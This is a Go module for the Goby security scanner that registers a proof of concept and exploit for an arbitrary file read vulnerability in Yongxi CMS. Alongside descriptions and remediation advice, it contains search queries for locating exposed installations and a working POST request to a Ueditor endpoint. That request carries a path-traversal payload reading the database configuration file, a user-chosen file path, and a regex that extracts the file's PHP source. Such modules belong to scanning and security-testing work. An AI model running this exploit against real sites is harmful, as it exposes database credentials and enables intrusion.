package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yongxi CMS index.php File Read Vulnerability",
    "Description": "<p>Yongxi CMS developed by Haiyongxi Information Technology Co., Ltd. is a professional website content management system. The index.php of the system has an arbitrary file read vulnerability. Attackers can use this vulnerability to read the content of any file on the server, resulting in sensitive information leakage, which may further cause more serious security issues.</p>",
    "Product": "Yongxi CMS",
    "Homepage": "https://www.yongsy.com/news/knowledge/2652.html",
    "DisclosureDate": "2024-09-19",
    "PostTime": "2024-11-06",
    "Author": "secure_insights@163.com",
    "FofaQuery": "body=\"Yongsy/Yongsy.js\" || body=\"Api/Ueditor/themes/iframe.css\" && body=\"Yongsy\" || body=\"yongsy\"",
    "GobyQuery": "body=\"Yongsy/Yongsy.js\" || body=\"Api/Ueditor/themes/iframe.css\" && body=\"Yongsy\" || body=\"yongsy\"",
    "Level": "1",
    "Impact": "<p>There is a file reading vulnerability in Yongxi cms index.php. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.</p>",
    "Recommendation": "<p>1. The official has not yet fixed the vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.yongsy.com\">https://www.yongsy.com</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_43167326/article/details/142350630"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "../../Apps/Common/Conf/dbconfig.php",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php?s=/Yongsylogin/Ueditor/getDirContent",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "filename=../../Apps/Common/Conf/dbconfig.php&type=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"status\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/index.php"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php?s=/Yongsylogin/Ueditor/getDirContent",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "filename={{{filepath}}}&type=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"status\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(<\\?php[\\s\\S]*?\\?>)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "雍熙CMS index.php 文件读取漏洞",
            "Product": "雍熙CMS",
            "Description": "<p>海雍熙信息技术有限公司开发的雍熙CMS是一款专业的网站内容管理系统。该系统的 index.php存在任意文件读取漏洞，攻击者可通过此漏洞读取服务器上的任意文件内容，导致敏感信息泄露，进一步可能引发更严重的安全问题。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.yongsy.com\">https://www.yongsy.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>雍熙cms index.php存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Yongxi CMS index.php File Read Vulnerability",
            "Product": "Yongxi CMS",
            "Description": "<p>Yongxi CMS developed by Haiyongxi Information Technology Co., Ltd. is a professional website content management system. The index.php of the system has an arbitrary file read vulnerability. Attackers can use this vulnerability to read the content of any file on the server, resulting in sensitive information leakage, which may further cause more serious security issues.<br></p>",
            "Recommendation": "<p>1. The official has not yet fixed the vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.yongsy.com\" target=\"_blank\">https://www.yongsy.com</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is a file reading vulnerability in Yongxi cms index.php. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "9968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}